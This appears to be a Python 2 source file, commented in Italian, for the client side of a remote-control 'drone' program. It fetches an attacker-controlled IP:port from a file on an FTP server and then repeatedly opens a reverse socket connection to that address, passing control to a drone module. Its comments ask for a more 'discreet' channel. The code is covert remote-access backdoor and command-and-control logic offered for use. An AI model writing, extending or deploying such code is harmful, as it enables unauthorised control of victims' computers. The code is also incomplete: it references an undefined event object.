# -*- coding: iso-8859-1 -*-
from __future__ import with_statement
from ftplib import FTP
from time import sleep
from drone import main as drone_main
import socket

class file_callable(file):
	def __call__(self,data):
		self.write(data)

# Implementare Change Location
# Implementare supporto HTTP/FTP
# Implementare Reset di fabbrica (flush di tutti i plugin non __SYSTEM e ritorno a locazione originaria)
# TODO: ELIMINARE Transazione FTP implementare HTTP (più semplice, già utilizzata, più discreta)
# TODO: MODO PER CAMBIARE LUOGO DELL'IP.txt
def retrive_coords():
        FTP_SERVER="deathmaker0.altervista.org"
        FTP_USER="deathmaker0"
        FTP_PASS=""
        FTP_DIR="/"
        FTP_FILE="IP.txt"
	f=FTP(FTP_SERVER,FTP_USER,FTP_PASS)
	t=f.cwd(FTP_DIR)
	with file_callable(FTP_FILE,"w") as fd:
		t=f.retrbinary("RETR "+FTP_FILE,fd);
	t=f.quit()
	del t,f
	fd=open(FTP_FILE,"r")
	line=fd.readline()
	fd.close()
	for j in range(0,len(line)):
		if line[j]==':': 
			IP=line[:j]
			Port=line[j+1:]
			break
	return (IP,int(Port))

tries=0
####################
#while True:
while False:
	print "BASE_REVERSE"
        if tries==60: tries=0 # Passata 1 ora
        if not tries: coords=retrive_coords()
        try:
        	s=socket.socket()
                continue_event.clear()
                s.connect(coords)
                # CONNECTED
                # Sara' la drone.main a lanciare una eccezione in caso di errore / Fine collegamento
                # in maniera che il seguente except non faccia altro che riniziare il loop della connessione
                drone_main(s)
        except:
                s.close()
        	continue_event.set()
                tries+=1
                sleep(60) # 1 minuto
                continue_event.wait()
